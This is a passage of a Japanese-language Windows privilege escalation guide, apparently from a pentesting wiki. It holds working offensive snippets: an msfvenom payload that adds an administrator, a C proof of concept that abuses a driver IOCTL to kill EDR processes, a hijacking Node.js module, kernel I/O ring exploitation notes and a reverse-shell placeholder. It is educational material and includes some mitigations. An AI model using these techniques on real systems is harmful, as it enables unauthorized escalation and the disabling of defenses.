C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて列挙してください:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**metasploitを使って**この脆弱性を検出し、悪用できます: `exploit/windows/local/trusted\_service\_path` metasploitを使ってサービスバイナリを手動で作成することもできます:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### 回復アクション

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能では、バイナリを指定できます。そのバイナリを置き換え可能な場合、privilege escalation が可能なことがあります。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## スケジュールされたタスクのスクリプト対象

有効なタスクが `.bat` または `.cmd` ファイルを指定して `cmd.exe /c` を実行する場合、`cmd.exe` に加えて、**action arguments** に指定されたスクリプトも確認してください。PowerShell の `-File` など、インタープリターに明示的にファイルを渡す場合も同様です。スケジュールされたバッチファイルに PowerShell の `-File` 呼び出しが直接記述されている場合は、参照先スクリプトの ACL も確認してください。変数、条件分岐、シェルの連結がある場合は、手動で追跡する必要があります。呼び出し元が書き込み可能なスクリプトまたは親ディレクトリが、アカウント間の実行につながるのは、設定されたタスクのプリンシパルが呼び出し元と異なり、かつタスクが実際にそのアクションに到達する場合に限られます。スクリプトでは追記のみ可能な ACL も問題になることがありますが、先行する `exit` や別の制御フローによって、追記した行が実行されない場合があります。privilege escalation を主張する前に、有効な ACL、[タスクの実行コンテキスト](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、作業ディレクトリ、トリガー、アプリケーション制御ポリシーを確認してください。インベントリ作業でスクリプトを変更したり、タスクを開始したりしないでください。

## アクセス可能なファイル上の名前付きストリーム

NTFS では、読み取り可能なファイルに名前付きの `:$DATA` ストリームが含まれていることがあり、その内容は通常のディレクトリ一覧には表示されません。アクセス可能なバックアップや設定ファイルのうち、関連性の高いものに絞り、内容を開く前にストリームの**名前とサイズ**を確認してください。Windows では [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) から、PowerShell では [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) から確認できます。秘密情報を示唆するストリーム名は、あくまで手掛かりです。ファイルへの実効読み取りアクセス、ファイルシステムがストリームをサポートしているか、ストリームに利用可能な認証情報が含まれているか、そしてその認証情報が実際にどのアカウントとして認証されるかを確認してください。通常の列挙では、再帰的なストリームスキャンやストリーム内容の出力を避けてください。

## スケジュールされた Windows Driver Kit ヘルパーの入力ファイル

オプションの Windows Driver Kit には `StandaloneRunner.exe` が含まれており、実行ディレクトリにある `command.txt`、`reboot.rsf`、およびプロジェクトの `working\rsf.rsf` ファイルを読み込むことがあります。特権アカウントでこのヘルパーを起動するスケジュールされたタスクまたはサービスがある場合、ヘルパーの実行ファイル自体が保護されていても、これらの入力ファイルへの低権限ユーザーの書き込みアクセスが、そのアカウントのコンテキストでのコマンド実行につながることがあります。特権アカウントで実行するプロセスが入力を読み込むこと、および**両方**のサイドカーファイルを作成または変更できることを確認してください。ヘルパーが見つかっただけでは不十分です。

スケジュールされたタスクでは、そのアクションの [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) と、2つのサイドカーファイルのパスに対する ACL を確認してください。タスクに作業ディレクトリが指定されていない場合、実行ファイルのディレクトリは確認すべき手掛かりにすぎず、タスクがそこから入力を読み込む証拠にはなりません。プロジェクトの作業ファイルに関する前提条件も満たす必要があります。SYSTEM で実行されると決めつけず、実際のタスクプリンシパルを確認してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（上書きして privilege escalation できる場合があります）と、**フォルダー**の権限（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent の修復パス

[CVE-2024-0670](https://checkmk.com/werk/16361) は、`C:\Windows\Temp` にコマンドファイルを書き込み、置き換えに失敗した場合に既存の書き込み保護されたファイルを実行してしまう、旧バージョンの Checkmk Windows agent に影響します。ベンダーは 2.1.0p40、2.2.0p23、2.3.0b1、2.4.0b1 でこの問題を修正しました。インストールされている正確なパッチレベルと、影響を受ける agent の操作を実行できるかどうかを確認してください。`2.1` のようにブランチのみを示す表記では、影響の有無を判断できません。ファイルの作成や agent コマンドの実行を伴わずに、バージョン、サービスの状態、Temp のアクセス許可を調べられます。

#### ADSelfService Plus SAML サービスの確認

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) は ADSelfService Plus の build 6210 以前に影響し、ベンダーは build 6211 で修正しました。この脆弱性が関係するのは、SAML SSO が**有効である、または過去に有効だった**場合に限られます。したがって、インストール済み製品の情報やサービスパスは手掛かりにすぎず、脆弱性の確定にはなりません。正確な build、SAML の設定履歴、サービスへのネットワーク到達性、実行アカウントを確認してください。このサービスを介したコード実行は、そのアカウントの権限を引き継ぎます。SYSTEM として実行されるのは、インスタンスが SYSTEM で実行されている場合に限られます。製品の Backup ディレクトリにある読み取り可能な `OfflineBackup_*.ezip` は、別個の暗号化バックアップに関する手掛かりであり、利用可能な認証情報やこの SAML の脆弱性を示す証拠ではありません。通常の列挙では展開せず、パスとアクセス権を記録してください。

#### Jenkins コントローラーとドメインアカウントの境界

Windows 上の Jenkins コントローラーでは、ジョブの作成・設定権限と起動権限を区別してください。[Jenkins ではこれらを別々の `Job/Create`、`Job/Configure`、`Job/Build` 権限として説明しています](https://www.jenkins.io/doc/book/security/access-control/permissions/)。設定済みのスケジュールやリモートトリガーが別のビルド経路になる場合もありますが、それが有効で、実際にビルドが実行されることを確認してください。実行時には、コントローラーまたは選択された agent の ID が使用されます。また、保存済みの認証情報を使用できるのは、ジョブがそのスコープにアクセスできる場合に限られます。別途、`JENKINS_HOME` のメタデータへのアクセスも確認してください。Jenkins は認証情報と暗号鍵の情報を `credentials.xml`、`secrets/hudson.util.Secret`、`secrets/master.key` に保持します（[Jenkins の secret storage](https://www.jenkins.io/doc/developer/security/secrets/)）。これらが存在するだけではパスワードは判明しません。共有出力に secret を表示せず、**必要なファイルへの読み取りアクセス**と、別個のアカウント再利用経路を確認してください。そのアカウントに AD ユーザーオブジェクトの `scriptPath` 書き込み権限がある場合、別ユーザーとしての実行とみなす前に、スクリプトパスが書き込み可能であること、および対象ユーザーとして実行される実際のログオン処理またはスケジュールされた処理があることを確認してください。追加のグループ制御については、実効 AD 権限を別途検証する必要があります。

#### Azure Pipelines セルフホスト agent の実行 ID

Azure DevOps Server または Azure Pipelines のプロジェクトでは、パイプラインの**作成または編集**権限と、パイプラインを**キューに登録**して選択した agent pool を使用する権限を分けて考えてください。[Microsoft はパイプラインの権限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)と[pool の認可](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)をそれぞれ個別に説明しています。低権限アカウントがスクリプトステップを登録し、そのパイプラインをセルフホスト Windows agent 上で実行できる場合、ステップは[agent に設定されたオペレーティングシステムアカウント](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)として実行されます。別ユーザーや SYSTEM への権限移行を主張する前に、対象のパイプライン、ブランチやリソースの制限、認可された pool、実行可能なジョブ、agent サービスの実行 ID を確認してください。agent がインストールされていること、プロジェクトのロール、リポジトリへの書き込み権限だけでは、手掛かりにすぎません。受動的な列挙では、ビルドを開始せずに権限とローカルのサービスメタデータを確認してください。

#### Microsoft Entra Connect Sync の認証情報

[Microsoft は](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)、同期サービスを実行して SQL データベースにアクセスする **ADSync service account** と、ディレクトリ権限が設定済みの同期機能に依存する **AD DS connector account** を区別しています。コネクタの認証情報はそのデータベースに暗号化して保存され、鍵の情報は[ADSync service account の下で DPAPI によって保護されます](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)。同期サービスがインストールされていること、ローカル管理者を連想させるグループがあること、データベースを閲覧できることだけでは、復号可能な認証情報やドメインへの権限昇格が立証されるわけではありません。実際のデータベース読み取り権限、サービスアカウントと鍵へのアクセス、インストール先と SQL の構成、設定されたコネクタ ID、その ID の実効 AD 権限をそれぞれ確認してください。通常の列挙では、サービスとアクセスのメタデータのみを表示し、保存された secret を照会したり表示したりしないでください。

#### プリンタードライバーのサポート DLL のアクセス許可

インストール済みのプリンタードライバーが `C:\ProgramData` 以下にサポート DLL を置き、より高い権限で実行される印刷プロセスに読み込ませる場合があります。プリンターの WMI 列挙が拒否されても、親ディレクトリや reparse point を含め、該当するドライバーのディレクトリと DLL の ACL を確認してください。[Ricoh のプリンタードライバーに関する問題 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) で報告されたパスは `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` です。[元の開示情報](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)では、`PrintIsolationHost.exe` による DLL の読み込みについて説明されています。書き込み可能な ACL は手掛かりにすぎません。拒否エントリを考慮した実効書き込み権限、該当ドライバーがインストールされていて、特権 ID の下でそのファイルを読み込むこと、ベンダーの更新済みドライバーまたはセキュリティプログラムでインストールが修正されているかを確認してください。ディレクトリ名やドライバーのバージョンだけから脆弱性を推測しないでください。

### 書き込み権限

設定ファイルを変更して特別なファイルを読み取れるか、または Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるか確認してください。

システム内のアクセス許可が弱いフォルダーやファイルを見つける方法の一つは、次のとおりです。

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` サブフォルダー内のすべての plugin DLL を自動ロードします。書き込み可能な portable/copy インストールが存在する場合、悪意のある plugin を配置すると、起動のたびに `notepad++.exe` 内でコードが自動実行されます（`DllMain` や plugin コールバックからも実行されます）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別のユーザーによって実行されるレジストリまたはバイナリを上書きできるか確認してください。**\
**権限昇格につながる可能性のある autoruns の場所**について詳しく知るには、**次のページを読んでください**。


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

**サードパーティ製の不審なドライバーや脆弱なドライバー**がないか探してください。

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

ドライバーが任意の kernel read/write プリミティブ（設計の不適切な IOCTL handler でよく見られる）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> 手順の詳細はこちらを参照してください。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

関連する Windows kernel-exploitation の資料：

user-writable な read/write registers を使う kernel-mode ring-buffer の事例については、[USB MIDI looped-streaming variant](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming) を参照してください。

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

脆弱な呼び出しが攻撃者制御の Object Manager path を開く race-condition バグでは、lookup を意図的に遅くする（最大長の component や深い directory chain を使う）ことで、数マイクロ秒の window を数十マイクロ秒まで広げられます。

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

Windows kernel LPE chain は、単独では弱い2つのバグから構築できる場合があります。1つは、queue lock が保持されたまま request/CBD を解放する **cancel-safe queue lifetime race**、もう1つは、`RtlCopyToUser` 中に解放済みの paged-pool allocation を漏えいさせる **lock-release-before-copy** disclosure です。<sup>[[29]](#references)</sup>

監査および exploitation に関するメモ：

- **Free-under-lock + cancel afterwards**：success path が **Acquire -> CompleteRequest/free -> Release** を実行し、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を実行する箇所を探します。success path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` でブロックされていた thread が後から再開し、解放済みの `PFLT_CALLBACK_DATA` をドライバーの remove callback に渡す可能性があります。
- 解放済みの queue object を、同じサイズの攻撃者制御 paged-pool allocation で **reclaim** します。`NPFS` Data Queue Entries は、payload と size を制御でき、後から pipe read/peek operations で調べられるため便利です。解放済み object に list link が含まれている場合は、それらを user memory 上の **cyclic list of fake request nodes** で上書きします。これにより、ドライバーは元の list head で停止せず、攻撃者が定義した request structure を繰り返し処理します。
- **予測可能な write を強化する**：fake request によって bookkeeping write（timestamp / QPC / refcount に隣接する field）で使われる nested context pointer を変更できる場合、**書き込み先のアドレスは制御できるが、書き込む値は制御できない** kernel write を得られることがあります。その場合は、最終的な code/data pointer ではなく、spray した pool object の **length/size** field を標的にしてから、破損した object が **out-of-bounds paged-pool read** を引き起こすまで spray を調べます。
- **Raceable disclosure のパターン**：`ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、どれも有力な候補です。攻撃者がコピーされる buffer を拡大できる場合（たとえば、serializer の最終的な allocation size を増やす list/resource entry を多数追加するなど）、マシンをクラッシュさせずに copy 時間を延ばして replacement window を広げられるため、信頼性が向上します。
- **Pointer が多く含まれる refill target**：Windows **I/O ring** の registered-buffer array は、paged-pool size（`8 * regBufferCnt`）を攻撃者が制御でき、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer であるため、優れた disclosure target です。これらの array の1つを漏えいさせて周囲の `IORING_OBJECT` を特定し、**`RegBuffers`** と **`RegBuffersCount`** を破損させます。すると、後続の I/O ring operations が攻撃者の偽造した entry を使い、任意の kernel read/write が可能になります。利用できる write が安定した byte（たとえば `KUSER_SHARED_DATA+0x14` 由来の値）だけの場合は、**重なり合う unaligned write** を使って `0x0101010101010101` のような同じ byte が並ぶ user pointer を作り、`VirtualAlloc` でそのアドレスを map して、偽造した registered-buffer array を配置します。<sup>[[30]](#references)</sup>

デバッグ時に役立つ指標：

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

破損した I/O ring から任意の kernel read/write を取得したら、標準的な post-primitive ワークフローを使って SYSTEM token を盗みます。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive のメモリ破損プリミティブ

最新の hive の脆弱性では、決定論的なレイアウトを groom し、書き込み可能な HKLM/HKU の子孫キーを悪用し、カスタムドライバーなしでメタデータの破損を kernel paged-pool overflow に変換できます。攻撃チェーンの全容はこちらをご覧ください。

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 攻撃者が制御するパスに起因する `RtlQueryRegistryValues` の direct-mode type confusion

一部のドライバーは、ユーザー空間からレジストリパスを受け取り、それが妥当な UTF-16 文字列であることだけを検証した後、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を呼び出し、`RTL_QUERY_REGISTRY_DIRECT` で `int readValue` などのスタック上のスカラーに値を書き込みます。`RTL_QUERY_REGISTRY_TYPECHECK` が指定されていない場合、`EntryContext` は開発者が想定した型ではなく、レジストリの**実際の**型に従って解釈されます。

これにより、次の2つの有用なプリミティブが生まれます。<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ユーザーが制御する絶対パス `\Registry\...` により、ドライバーに攻撃者が選んだキーを照会させ、戻り値やログを通じてキーの存在を漏えいさせたり、呼び出し元が直接アクセスできない値を読み取らせたりできる場合があります。
- **Kernel memory corruption**: `&readValue` のようなスカラーの格納先は、レジストリ値の型に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定のバイナリバッファとして型を誤認されます。

実践的な exploit の注意点:

- **Windows 8 以降の緩和策**: `RTL_QUERY_REGISTRY_TYPECHECK` を指定せずに `RTL_QUERY_REGISTRY_DIRECT` で**信頼されていない hive**を照会すると、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` でクラッシュします。exploitability を維持するには、値を `HKCU` に配置するのではなく、**信頼されたシステム hive 内の攻撃者が書き込み可能なキー**を探してください。
- **信頼された hive へのステージング**: NtObjectManager を使って `\Registry\Machine` 以下の書き込み可能な子孫キーを列挙し、複製した**低整合性**トークンでスキャンを再実行して、sandbox 化されたコンテキストからアクセス可能なキーを見つけます。<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 8バイトの値を4バイトの`int`に直接書き込むと、隣接するスタックデータが破損し、近くのコールバック／関数ポインターを部分的に上書きする可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指していることを想定します。コードが攻撃者制御の`REG_DWORD`をスタックスカラーに読み込み、その後、同じバッファーを文字列読み取りに再利用すると、攻撃者が`Length` / `MaximumLength`を制御し、`Buffer`ポインターにも部分的な影響を与え、半制御のカーネル書き込みが可能になります。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは`EntryContext`にある最初の`LONG`を符号付きバッファーサイズとして扱います。先行する`REG_DWORD`の読み取りで、再利用されたスカラーに攻撃者制御の**負の値**が残っていると、次の`REG_BINARY`クエリで攻撃者のバイト列が隣接するスタックスロットに直接コピーされます。これは多くの場合、コールバックポインターを完全に上書きする最も簡潔な手段です。

強力な探索パターン: **再初期化せずに、同じスタック変数へ異なる型のレジストリ読み取りを行うこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される`EntryContext`ポインター、最初のレジストリ読み取りによって2回目の読み取りが行われるかどうかが決まるコードパスをgrepします。

#### デバイスオブジェクトでのFILE_DEVICE_SECURE_OPEN未設定の悪用 (LPE + EDR kill)

一部の署名済みサードパーティードライバーは、IoCreateDeviceSecureを使って強力なSDDLを指定してデバイスオブジェクトを作成しますが、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れています。このフラグがないと、追加コンポーネントを含むパス経由でデバイスを開く際にセキュアDACLが適用されず、次のような名前空間パスを使うことで、特権のないユーザーでもハンドルを取得できます:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際の事例)

ユーザーがデバイスを開けると、そのドライバーが公開している特権IOCTLを悪用し、LPEや改ざんを行えます。実環境で確認された機能の例:
- 任意のプロセスへのフルアクセスハンドルの返却 (トークン窃取 / DuplicateTokenEx/CreateProcessAsUserによるSYSTEMシェル)。
- 制限のないraw disk読み書き (オフライン改ざん、起動時の永続化手法)。
- Protected Process/Light (PP/PPL)を含む任意のプロセスの終了。カーネル経由でユーザーランドからAV/EDR killが可能。

最小限のPoCパターン (ユーザーモード):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

開発者向けの緩和策
- DACLで制限するデバイスオブジェクトを作成する場合は、必ず FILE_DEVICE_SECURE_OPEN を設定してください。
- 特権操作では呼び出し元のコンテキストを検証してください。プロセスの終了やハンドルの返却を許可する前に、PP/PPL チェックを追加してください。
- IOCTL（アクセスマスク、METHOD_*、入力検証）を制限し、カーネル特権を直接使うのではなく、ブローカー経由のモデルを検討してください。

防御側向けの検出案
- 不審なデバイス名（例：\\ .\\amsdk*）へのユーザーモードからのオープンや、悪用を示す特定の IOCTL シーケンスを監視してください。
- Microsoft の脆弱なドライバーのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可リスト／拒否リストも維持してください。


## PATH DLL Hijacking

**PATH 上にあるフォルダー内への書き込み権限**があれば、プロセスによって読み込まれる DLL をハイジャックし、**権限を昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH 内のすべてのフォルダーの権限を確認してください:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

このチェックを悪用する方法の詳細については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` 経由の Node.js / Electron module resolution hijacking

これは **Windows uncontrolled search path** の亜種で、`require("foo")` のような bare import を実行した際に、想定されるモジュールが **見つからない** 場合に **Node.js** と **Electron** アプリケーションに影響します。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上にたどり、各親ディレクトリの `node_modules` フォルダーを確認してパッケージを解決します。Windows では、この探索がドライブのルートまで到達する可能性があります。そのため、`C:\Users\Administrator\project\app.js` から起動したアプリケーションは、次の場所を順に調べることがあります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（またはパッケージフォルダー）を設置し、**より高い権限で実行される Node/Electron プロセス**が見つからない依存関係を解決するのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者権限で実行される場合、昇格されたタスクスケジューラのタスクやサービスラッパーから実行される場合、または特権を持つデスクトップアプリとして自動起動される場合、これは **LPE** につながります。

特に次のような場合によく発生します。

- 依存関係が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- サードパーティライブラリが `require("foo")` を `try/catch` で囲み、失敗しても処理を続ける
- 本番ビルドからパッケージが削除された、パッケージング時に含まれなかった、またはインストールに失敗した
- 脆弱な `require()` がメインのアプリケーションコードではなく、依存関係ツリーの奥深くにある

### 脆弱なターゲットの調査

**Procmon** を使って解決パスを確認します。<sup>[[23]](#references)</sup>

- `Process Name` = 対象の実行ファイル（`node.exe`、Electron アプリの EXE、またはラッパープロセス）でフィルターする
- `Path` が `node_modules` を `contains` する条件でフィルターする
- `NAME NOT FOUND` と、最終的に `C:\node_modules` から正常に開かれる箇所に注目する

展開した `.asar` ファイルやアプリケーションのソースコードで確認するとよいコードレビュー上のパターンは次のとおりです。

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon またはソースレビューから**不足しているパッケージ名**を特定します。
2. まだ存在しない場合は、root lookup directory を作成します。

```powershell
mkdir C:\node_modules
```

3. 想定される正確な名前のモジュールを配置する：

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. 被害者アプリケーションを起動します。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込むことがあります。

このパターンに当てはまる、実際によくある不足したオプションモジュールには `bluebird` や `utf-8-validate` があります。ただし、再利用可能な部分は**technique**です。特権で動作する Windows の Node/Electron プロセスが解決する、あらゆる**不足した bare import**を探します。

### 検知とハードニングのアイデア

- ユーザーによる `C:\node_modules` の作成や、その中への新しい `.js` ファイルやパッケージの書き込みをアラートします。
- `C:\node_modules\*` から読み込む高整合性プロセスを調査します。
- 本番環境ではすべてのランタイム依存関係をパッケージ化し、`optionalDependencies` の使用状況を監査します。
- サードパーティ製コードに、エラーを黙殺する `try { require("...") } catch {}` パターンがないか確認します。
- ライブラリが対応している場合はオプションのプローブを無効にします（たとえば、一部の `ws` のデプロイでは `WS_NO_UTF_8_VALIDATE=1` を指定して、レガシーな `utf-8-validate` のプローブを回避できます）。

## ネットワーク

### 共有

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

hosts file にハードコードされている他の既知のコンピューターを確認する

```
type C:\Windows\System32\drivers\etc\hosts
```

### ネットワークインターフェースと DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 開いているポート

外部から**制限されたサービス**を確認する

```bash
netstat -ano #Opened ports?
```

ローカルリスナーについては、PID とプロセスの所有者、実行ファイルのパス、および起動元のサービスやスケジュールタスクを照合します。リモートコントロールサービスからデスクトップユーザーとしてアクセスできるかどうかは、認証とコマンド制御の設定によります。高い権限を持つアカウントで実行されるカスタム TCP アプリケーションは、別途調査すべき対象です。リスナーとバイナリのパスは受動的な手がかりにすぎず、認証済みのメモリ破損経路を確認するには、そのバイナリと到達可能な入力を分析する必要があります。公開ポートがシステムプロセスに属しているように見える場合は、バックエンドサービスを特定する前に [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) と照合してください。転送ルールがあるだけでは、転送先に到達可能であることも、脆弱であることも証明できません。

### ルーティングテーブル

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARPテーブル

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### ファイアウォール ルール

[**ファイアウォール関連のコマンドはこちらを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化...）**

ネットワーク列挙用のコマンドは[こちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

rootユーザーを取得すると、任意のポートで listen できます（初めて `nc.exe` を使ってポートを listen するときは、ファイアウォールで `nc` を許可するかどうかを GUI で確認されます）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

bash を root として簡単に起動するには、`--default-user root` を試してください。

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで `WSL` のファイルシステムを確認できます。

